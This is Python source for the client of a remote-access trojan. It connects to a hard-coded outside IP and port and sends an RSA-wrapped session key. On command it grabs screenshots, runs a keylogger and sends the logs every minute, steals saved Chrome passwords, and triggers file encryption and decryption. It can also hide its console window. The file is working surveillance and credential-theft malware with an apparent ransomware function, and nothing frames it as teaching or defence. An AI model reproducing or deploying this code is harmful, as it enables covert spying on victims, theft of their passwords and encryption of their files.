import socket
import signal
import sys
import threading, time
from Queue import Queue
import passwords, keylog
import base64
from PIL import ImageGrab
from packet import Packet
from encryption import encrypt,decrypt
import os

def hide():
    import win32console,win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True

def signal_handler(signal, frame):
        print('You pressed Ctrl+C!')
        sys.exit(0)

class Client:

    def __init__(self,ip='54.69.185.61',port=5715):
        self.messageQ = Queue()
        self.key = os.urandom(16)
        TCP_IP = ip
        TCP_PORT = port

        self.RSAPublicKey = '-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAonQkIgH5+WBaEGAfqH6J\nGW3M7vYwPCHz9tmz1ToH82YVDBaX9qNUxJRs3t5QNrvgNo9Dfem6nnXpgIdSykhe\nO1EB2CVJ2Z92bewBmYu8Pda3BOURq0mi1gsn5fna3JVyQkB/gElSld0elQ5BubKn\n6wCh3tCWj8FS66DY8U9f6aeRMN1QBPPprd1zsbixafeLg5Cc+utIXCtRTZDeCL2d\n7pccI276OC2r7GHwMUAsFqdYpva2W4PmC+AHe9eZk9FknCc/pXD8AdeUccDAZ7wR\no/VFqbKCQR6Ei6ooUFXGEXdJU9tEuxPYb+CM1uGjEyqvuDGvUJS+fbOtMhM1L/kS\nKwIDAQAB\n-----END PUBLIC KEY-----'

        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((TCP_IP, TCP_PORT))
        self.sendAESKey()

    def run(self):

        threading.Thread(target=self.dequeue).start()

        while True:
            pkt = Packet()
            pkt.construct(self.s)
            if pkt.state:
                if pkt.state == "143":
                    threading.Thread(target=self.screenshot,args=[pkt]).start()
                elif pkt.state == "144":
                    threading.Thread(target=self.passwords,args=[pkt]).start()
                elif pkt.state == "145":
                    threading.Thread(target=self.keylog,args=[pkt]).start()
                elif pkt.state == "146":
                    threading.Thread(target=self.encrypt,args=[pkt]).start()
                elif pkt.state == "147":
                    threading.Thread(target=self.decrypt,args=[pkt]).start()
                else:
                    print "i don't know that command"

    def screenshot(self,pkt):
        ImageGrab.grab().save("C:\Windows\System32\scrnsht.png", "png")
        f = open('C:\Windows\System32\scrnsht.png', 'rb')
        fread = f.read()
        f.close()
        state = "143"
        size = len(fread)
        data = fread

        pkt.state = state
        pkt.data = data
        pkt.length = size

        self.enqueue(pkt)

    def keylog(self,pkt):
        import shutil
        path = "C:\Windows\System32\keylogs.txt"
        kl = keylog.keyLogger(path)
        threading.Thread(target=kl.run).start()
        for i in range(0,1440):
            time.sleep(60)
            k = open(path,"rb")
            state = "145"
            data = k.read()
            size = len(data)

            pkt.state = state
            pkt.data = data
            pkt.length = size

            self.enqueue(pkt)

    def encrypt(self,pkt):
        data = encrypt()
        if data != "already encrypted":
            pkt.data = data
            pkt.length = len(data)
        else:
            pkt.data = "nope"
            pkt.length = 4
        
        self.enqueue(pkt)

    def decrypt(self,pkt):
        if pkt.data != "":
            decrypt(pkt.data)

    def passwords(self,pkt):
        message = passwords.getChromePasswords()
        state = "144"
        data = "\n".join(message)
        size = len(data)

        pkt.state = state
        pkt.data = data
        pkt.length = size

        self.enqueue(pkt)

    def sendAESKey(self):
        pkt = Packet()
        pkt.state = '100'
        pkt.toIP = ''
        pkt.returnIP = 'MRS'
        pkt.data = self.key
        pkt.RSAEncryptData(self.RSAPublicKey)
        pkt.length = len(self.data)
        self.messageQ.put(pkt)

    def enqueue(self,pkt):
        pkt.encryptData(self.key)
        self.messageQ.put(pkt)

    def dequeue(self):
        while True:
            pkt = self.messageQ.get()
            pkt.send(self.s)
            print "sent"

def main():
    c = Client()
    c.run()

if __name__ == '__main__':
    # hide()
    #signal handlers
    signal.signal(signal.SIGINT, signal_handler)

    #run the program
    main()